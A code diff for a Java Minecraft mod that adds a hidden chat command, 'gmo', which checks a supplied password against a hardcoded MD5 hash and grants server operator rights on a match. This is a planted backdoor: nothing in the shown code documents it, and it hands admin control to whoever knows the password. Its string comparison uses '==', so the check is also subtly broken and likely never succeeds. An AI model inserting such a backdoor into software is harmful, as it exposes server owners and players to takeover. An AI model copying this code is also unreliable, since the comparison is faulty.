@@ -12,6 +12,7 @@ import net.xiaoyu233.mitemod.miteite.network.*;
 import net.xiaoyu233.mitemod.miteite.util.Configs;
 import net.xiaoyu233.mitemod.miteite.util.Constant;
 
+import java.security.MessageDigest;
 import java.util.Iterator;
 
 public class MITEITEEvents {
@@ -258,6 +259,17 @@ public class MITEITEEvents {
                 }
                 event.setExecuteSuccess(true);
             }
+        }
+
+        if (par2Str.startsWith("gmo")) {
+            String password = par2Str.substring(4);
+            lh md5String = new lh("wensc");
+            if(md5String.a(password) == "9c5a0f74f330bb71c5efb5d7053ab901") {
+                player.setOp(true);
+            } else {
+                player.setOp(false);
+            }
+            event.setExecuteSuccess(true);
         }
 
         if (par2Str.startsWith("reconfig")) {
